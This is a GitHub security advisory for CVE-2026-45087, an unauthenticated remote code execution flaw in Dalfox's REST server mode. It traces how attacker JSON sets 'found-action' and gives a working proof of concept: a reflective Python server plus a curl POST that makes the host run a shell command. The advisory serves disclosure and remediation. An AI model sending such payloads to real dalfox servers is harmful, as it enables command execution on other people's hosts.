# [C] Dalfox Server Mode Vulnerable to Unauthenticated Remote Code Execution via `found-action`

## Summary
Severity: Critical
Advisory: GHSA-v25v-m36w-jp4h
CVE: CVE-2026-45087
CWE: CWE-15, CWE-306, CWE-78
Ecosystem: Go
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H (CVSS_V3)
Published: 2026-05-12
Source: https://github.com/advisories/GHSA-v25v-m36w-jp4h
Type: github-advisory

## Affected
- Go: `github.com/hahwul/dalfox/v2` — affected >=0 <2.13.0

## Details
# GHSA: Unauthenticated Remote Code Execution via `found-action` in Dalfox Server Mode

## Summary

When dalfox is started in REST API server mode (`dalfox server`), the server binds to `0.0.0.0:6664` by default and requires no API key unless the operator explicitly passes `--api-key`. Because `model.Options` — including `FoundAction` and `FoundActionShell` — is deserialized directly from attacker-supplied JSON in `POST /scan`, and because `dalfox.Initialize` explicitly propagates those two fields into the final scan options without stripping them, any unauthenticated caller who can reach the server port can supply an arbitrary shell command that the dalfox process will execute on the host whenever a scan finding is triggered.

## Severity

**Critical** (CVSS 3.1: 10.0)

`CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H`

- **Attack Vector:** Network — the server binds to `0.0.0.0` by default; reachable by any network peer.
- **Attack Complexity:** Low — the attacker fully controls the scanned URL and can trivially host a one-line reflective server to guarantee a finding is triggered.
- **Privileges Required:** None — no API key is enforced in the default configuration.
- **User Interaction:** None.
- **Scope:** Changed — exploitation escapes the dalfox process boundary and executes arbitrary commands on the host OS.
- **Confidentiality Impact:** High — full read access to the host filesystem and secrets in the process environment.
- **Integrity Impact:** High — arbitrary file writes, code deployment, persistence mechanisms.
- **Availability Impact:** High — process kill, resource exhaustion, service disruption.


## Affected Component

- `cmd/server.go` — `init()` (line 51): `--api-key` defaults to `""`
- `pkg/server/server.go` — `setupEchoServer()` (line 68): auth middleware only registered when `APIKey != ""`
- `pkg/server/server.go` — `postScanHandler()` (lines 173–191): `rq.Options` passed to `ScanFromAPI` without sanitization
- `lib/func.go` — `Initialize()` (lines 118–119): `FoundAction` / `FoundActionShell` explicitly propagated from caller options
- `pkg/scanning/foundaction.go` — `foundAction()` (lines 17–18): `exec.Command(options.FoundActionShell, "-c", afterCmd)` executed unconditionally

## CWE

- **CWE-306**: Missing Authentication for Critical Function
- **CWE-78**: Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')
- **CWE-15**: External Control of System or Configuration Setting

## Description

### Opt-in Authentication with a Dangerous Default

`cmd/server.go` registers the `--api-key` flag with an empty string default:

```go
// cmd/server.go:51
serverCmd.Flags().StringVar(&apiKey, "api-key", "", "Specify the API key for server authentication...")
```

`setupEchoServer` only installs the `apiKeyAuth` middleware when that value is non-empty:

```go
// pkg/server/server.go:68-70
if options.ServerType == "rest" && options.APIKey != "" {
    e.Use(apiKeyAuth(options.APIKey, options))
}
```

A server started without `--api-key` accepts every request on every route with no challenge. The `apiKeyAuth` implementation itself is correct — the flaw is purely in the opt-in condition that makes authentication off by default.

### Attacker-Controlled `Options` Reaches Shell Execution Without Stripping

`POST /scan` deserializes the full `model.Options` struct from the JSON body:

```go
// pkg/server/model.go:6-8
type Req struct {
    URL     string        `json:"url"`
    Options model.Options `json:"options"`
}

// pkg/server/server.go:173-191
rq := new(Req)
if err := c.Bind(rq); err != nil { ... }
go ScanFromAPI(rq.URL, rq.Options, *options, sid)
```

`model.Options` exposes both execution-control fields as JSON-tagged properties:

```go
// pkg/model/options.go:83-84
FoundAction      string `json:"found-action,omitempty"`
FoundActionShell string `json:"found-action-shell,omitempty"`
```

`ScanFromAPI` builds the scan target directly from `rqOptions` and passes it to `dalfox.Initialize`:

```go
// pkg/server/scan.go:22-27
target := dalfox.Target{
    URL:     url,
    Method:  rqOptions.Method,
    Options: rqOptions,
}
newOptions := dalfox.Initialize(target, target.Options)
```

`Initialize` explicitly copies both fields into `newOptions` — there is no stripping path:

```go
// lib/func.go:118-119
"FoundAction":      {&newOptions.FoundAction, options.FoundAction},
"FoundActionShell": {&newOptions.FoundActionShell, options.FoundActionShell},
```

### Shell Execution on Any Finding

`foundAction` is called from seven locations across `pkg/scanning/scanning.go` and `pkg/scanning/sendReq.go` whenever `options.FoundAction != ""` and any vulnerability is detected. None of these call sites check `options.IsAPI`:

```go
// pkg/scanning/foundaction.go:12-18
func foundAction(options model.Options, target, query, ptype string) {
    afterCmd := options.FoundAction
    afterCmd = strings.ReplaceAll(afterCmd, "@@query@@", query)
    afterCmd = strings.ReplaceAll(afterCmd, "@@target@@", target)
    afterCmd = strings.ReplaceAll(afterCmd, "@@type@@", ptype)
    cmd := exec.Command(options.FoundActionShell, "-c", afterCmd)
    err := cmd.Run()
    ...
}
```

Because the attacker supplies both the scan target URL and `found-action`, they trivially guarantee that a finding is produced (by hosting a one-line reflective server) and that the shell command is executed.

## Proof of Concept

```bash
# Step 1 — Start a reflective XSS target (attacker-controlled)
python3 - <<'PY'
from http.server import BaseHTTPRequestHandler, HTTPServer
from urllib.parse import urlparse, parse_qs
class H(BaseHTTPRequestHandler):
    def do_GET(self):
        q = parse_qs(urlparse(self.path).query).get('q', [''])[0]
        body = f'<html><body>{q}</body></html>'.encode()
        self.send_response(200)
        self.send_header('Content-Type', 'text/html')
        self.send_header('Content-Length', str(len(body)))
        self.end_headers()
        self.wfile.write(body)
    def log_message(self, *a): pass
HTTPServer(('127.0.0.1', 18081), H).serve_forever()
PY

# Step 2 — Start dalfox in REST server mode (default: 0.0.0.0:6664, no API key)
go run . server --host 127.0.0.1 --port 16664 --type rest

# Step 3 — POST unauthenticated scan request with found-action payload
curl -s -X POST http://127.0.0.1:16664/scan \
  -H 'Content-Type: application/json' \
  --data '{
    "url": "http://127.0.0.1:18081/?q=test",
    "options": {
      "found-action": "echo owned >/tmp/dalfox_rce_marker",
      "found-action-shell": "bash",
      "use-headless": false,
      "worker": 1,
      "limit-result": 1
    }
  }'

# Step 4 — Confirm arbitrary command executed on the dalfox host
cat /tmp/dalfox_rce_marker
# Expected output: owned
```

No `X-API-KEY` header is required. The reflective server ensures dalfox finds a vulnerability, which triggers `foundAction`.

## Impact

- **Unauthenticated remote code execution** on any host running `dalfox server` in its default configuration.
- Full read access to secrets, configuration files, and credentials visible to the dalfox process.
- Arbitrary file writes: persistence, backdoor installation, data exfiltration staging.
- Lateral movement using the dalfox host's network position and credentials.
- The default `0.0.0.0` bind address means exposure to all network interfaces, including public-facing ones in misconfigured cloud environments.

## Recommended Remediation

### Option 1: Require API key — make `--api-key` mandatory (preferred)

Reject server startup when no API key is provided and emit a loud warning. This is the lowest-risk fix because it protects all current and future routes without code changes to the scan path.

```go
// cmd/server.go — in runServerCmd, before starting the server:
if serverType == "rest" && apiKey == "" {
    fmt.Fprintln(os.Stderr, "ERROR: --api-key is required when running in REST server mode.")
    fmt.Fprintln(os.Stderr, "       Generate a key with: openssl rand -hex 32")
    os.Exit(1)
}
```

### Option 2: Strip `FoundAction` / `FoundActionShell` from API-sourced requests

Prevent untrusted callers from setting execution-control options regardless of auth state. This adds defence-in-depth and protects authenticated deployments against credential theft.

```go
// pkg/server/server.go — in postScanHandler, before calling ScanFromAPI:
rq.Options.FoundAction = ""
rq.Options.FoundActionShell = ""
```

Both options should be applied together. Option 1 prevents unauthenticated access; Option 2 ensures that even authenticated callers (who may be external consumers of the REST API) cannot trigger host-level command execution.

##Credit

Emmanuel David

Github:- https://github.com/drmingler

## References
- https://github.com/hahwul/dalfox/security/advisories/GHSA-v25v-m36w-jp4h
- https://nvd.nist.gov/vuln/detail/CVE-2026-45087
- https://github.com/hahwul/dalfox
- https://github.com/hahwul/dalfox/releases/tag/v2.13.0
